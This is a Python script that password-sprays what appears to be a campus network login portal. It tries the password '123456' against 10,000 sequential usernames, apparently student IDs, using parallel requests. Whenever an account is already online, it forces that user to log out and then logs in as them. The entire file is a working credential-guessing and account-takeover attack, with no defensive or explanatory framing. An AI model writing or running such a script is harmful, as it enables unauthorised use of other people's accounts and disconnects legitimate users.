# -*- coding: utf-8 -*-
from __future__ import unicode_literals
from requests import post
from multiprocessing.dummy import Pool

url="http://172.31.1.5/include/auth_action.php"

para={
    'action':'login',
    'username':'',
    'password':'123456',
    'ac_id':'6',
    'user_ip':'172.18.64.8',
    'nas_ip':'',
    'user_mac':'',
    'save_me':'0',
    'ajax':'1',
}
logout={
    'action':'logout',
    'username':'',
    'password':'123456',
    'ajax':'1'
}
alluser=list(range(20020000,20030000))
def postmes(username):
    para['username']=username
    content=post(url,para).content.decode('utf-8')
    if content.find('在线')!=-1:
        logout['username']=username
        post(url,logout)
        content=post(url,para).content.decode('utf-8')
    print(username,content)

# for i in range(20040000,20041345):
#     para['username']=str(i)
#     k=post(url,para)
#   # if k.content.decode('utf-8').find('ok')!=-1:
#     print(i,k.content.decode('utf-8'))
pool=Pool(processes=4)
pool.map(postmes,alluser)
pool.close()
pool.join()
# post(url,logout)